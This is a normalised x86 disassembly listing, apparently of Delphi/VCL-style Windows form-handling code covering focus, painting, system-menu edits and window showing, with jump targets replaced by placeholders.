mov [ fs : eax ] edx
push sub_45d9f3
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403a6c
jmp r-xdata
call sub_403a6c
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_445e7c
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_4493d8
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_4597b4
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_443d6c
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
call sub_403a6c
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_4493d8
mov dx 0xb01a
call sub_4597b4
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403a6c
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_443d6c
sub_45da10
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_443d6c
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_4493d8
push eax
call SetFocus
mov eax ebx
call sub_4493d8
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_45da60
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_443d6c
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_45db14
mov eax esi
call sub_45da10
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_449800
mov edx eax
mov eax esi
call sub_45d658
sub_45dac4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45c6dc
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_443d6c
mov eax ebx
call sub_45c6dc
mov edx esi
call sub_45dac4
sub_45db14
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_456a98
mov edx esi
call sub_456a7c
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45dbbc
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
sub_45dc08
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_45dbbc
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45dc38
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_45dbbc
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_45dca4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4246c4
xor eax eax
push ebp
push sub_45dd52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_424a38
xor eax eax
push ebp
push sub_45dd2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403430
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dd36
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_424a38
retn
sub_45dd60
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_45c6dc
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_45c710
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403430
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_448668
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_45c75c
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403430
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_45de00
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4493d8
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_4493d8
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_45dc88
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_4493d8
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_447530
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_45de7e
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_4242a4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_45dee0
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4493d8
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_4477f4
pop edi
pop esi
retn
sub_45df2c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4493d8
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_45e028
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_45ca50
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_45df2c
pop ecx
sub_45e05c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_444288
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4493d8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4493d8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4493d8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_443260
pop esi
pop ebx
retn
sub_45e0ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_4485f4
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_4493d8
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_4564b8
sub_45e14c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_447690
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_455ecc
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_45e198
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_45672c
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45e1d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45e26b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e272
lea eax [ ebp - 0x4 ]
call sub_404008
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_455e2c
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_463034
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43fd1c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_463034
jmp r-xdata
sub_45e298
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403430
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_45e2d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40d074
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_45e304
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_45dac4
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43faf4
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_45e35c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4484d8
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_461940
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403430
sub_45e3e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_4493d8
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_4493d8
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_4493d8
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45e480
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4493d8
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_45da60
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403430
sub_45e4d8
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_44990c
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_45e504
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_45dac4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45e520
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_455e5c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_455e5c
sub_45e560
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_45e598
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_40405c
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_45e5cc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45e71d
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e724
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_45e520
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43fa98
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_41900c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_4426d0
lea eax [ ebp - 0x1c ]
call sub_406dec
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_45e520
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45e560
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_462cd8
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_462d40
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_462d40
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_45e598
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_41900c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_4426d0
lea eax [ ebp - 0x1c ]
call sub_406dec
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_462c70
test [ esi + 0x228 ] 0x8
je r-xdata
sub_45e72c
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_45e7a0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_45e7cc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44793c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45c7dc
lea edx [ ebp - 0x14 ]
call sub_45ffa4
push ebp
mov eax [ ebp - 0x4 ]
call sub_45c7dc
lea edx [ ebp - 0x24 ]
call sub_45ffa4
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_45e7a0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_45c7dc
lea edx [ ebp - 0x24 ]
call sub_45ffa4
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_45e7a0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45e7a0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_45e7a0
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_45e884
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403430
pop esi
pop ebx
retn
sub_45e8a8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403430
pop esi
pop ebx
retn
sub_45e8cc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_44881c
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_44990c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_44990c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45e968
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45eed2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_463124
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_45eeb5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45eebc
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
push ebp
push sub_45edbc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_45ea20
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45db14
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4468f8
jmp r-xdata
mov eax [ rw-data ]
call sub_460200
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
